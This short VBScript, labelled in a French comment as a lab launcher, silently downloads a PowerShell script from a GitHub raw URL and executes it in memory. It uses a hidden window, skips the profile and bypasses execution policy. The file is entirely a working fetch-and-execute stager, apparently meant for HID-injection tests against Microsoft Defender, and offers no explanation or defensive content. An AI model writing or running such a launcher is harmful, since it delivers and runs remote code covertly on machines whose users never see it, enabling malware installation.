' Lab ROE — lance defender-hid-lab.ps1 sans fenetre console (style 0).
Dim cmd
cmd = "powershell -nop -w hidden -ep bypass -c ""irm -UseBasicParsing '" & _
  "https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main/defender-hid-lab.ps1' | iex"""
CreateObject("WScript.Shell").Run cmd, 0, False